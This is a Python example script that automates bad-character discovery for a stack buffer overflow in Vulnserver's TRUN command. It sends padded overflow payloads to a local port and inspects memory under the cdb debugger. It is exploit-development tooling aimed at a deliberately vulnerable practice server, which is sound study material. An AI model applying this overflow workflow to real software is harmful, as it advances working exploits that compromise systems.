"""
vulnserver_trun.py  -  Bad char discovery for Vulnserver TRUN command
======================================================================

Target:   Vulnserver (TRUN command)
Protocol: Raw TCP (port 9999)
Command:  TRUN /.:/<payload>
Offset:   2006 bytes to EIP (confirm with your own pattern offset run)

Vulnserver is single-connection: it processes one command and the
process crashes. This means cdb must restart between iterations.
restart_on_crash=True and restart_delay handle this.

TRUN is a simple case: no stateful login, one-shot TCP send.
The CLI --prefix approach works here, but this example shows
the importable API for reference.

HOW TO USE
----------
1. Adjust CDB_PATH and TARGET_EXE.
2. Run:  python vulnserver_trun.py

NOTE ON OFFSET
--------------
Vulnserver's TRUN handler copies into a fixed buffer via strcpy.
The destination buffer starts at the beginning of the data region.
OFFSET = 2006 means the first 2006 bytes are padding (A*2006),
then MAGIC, then the test bytes follow.

If you want to dump starting exactly at MAGIC to reduce dump size:
  dump_expr = "poi(@esp+4)+2006"
  OFFSET = 0  (in the tool, offset means offset-within-the-dump-region)

The example below uses the simpler full-buffer approach.
"""

import socket
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from badchar_auto import BadCharOrchestrator, Stage, MAGIC_BINARY

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9999

OFFSET     = 2006
TOTAL_SIZE = 3000

CDB_PATH   = r"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe"
TARGET_EXE = r"C:\vulnserver\vulnserver.exe"

# Only null is typically bad for Vulnserver, but check everything
EXCLUDE = (0x00,)

# ---------------------------------------------------------------------------
# Protocol sender
# ---------------------------------------------------------------------------

def send_trun(payload: bytes) -> None:
    """
    TRUN command framing:  TRUN /.:/<payload>
    Vulnserver expects the command on one line. No \\r\\n needed —
    the server reads until it has enough data, but adding \\r\\n is safe.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((TARGET_HOST, TARGET_PORT))
        s.recv(64)  # "Welcome to Vulnerable Server!..."
        s.sendall(b"TRUN /.:/" + payload + b"\r\n")
        try:
            s.recv(64)
        except Exception:
            pass
    finally:
        s.close()

# ---------------------------------------------------------------------------
# Stage
# ---------------------------------------------------------------------------

STAGE = Stage(
    name       = "trun_strcpy",
    breakpoint = "msvcrt!strcpy",
    dump_expr  = "poi(@esp+4)",
    dump_size  = 512,
    step_mode  = "pt",
)

# ---------------------------------------------------------------------------
# Run
# ---------------------------------------------------------------------------

def main() -> int:
    orch = BadCharOrchestrator(
        stage            = STAGE,
        sender           = send_trun,
        offset           = OFFSET,
        total_size       = TOTAL_SIZE,
        exclude          = EXCLUDE,
        magic            = MAGIC_BINARY,
        dump_dir         = r"C:\badchar",
        cdb_path         = CDB_PATH,
        target_exe       = TARGET_EXE,
        timeout          = 10,
        restart_on_crash = True,
        restart_delay    = 1.0,
    )

    orch.run_full(max_iterations=30)
    return 0


if __name__ == "__main__":
    sys.exit(main())
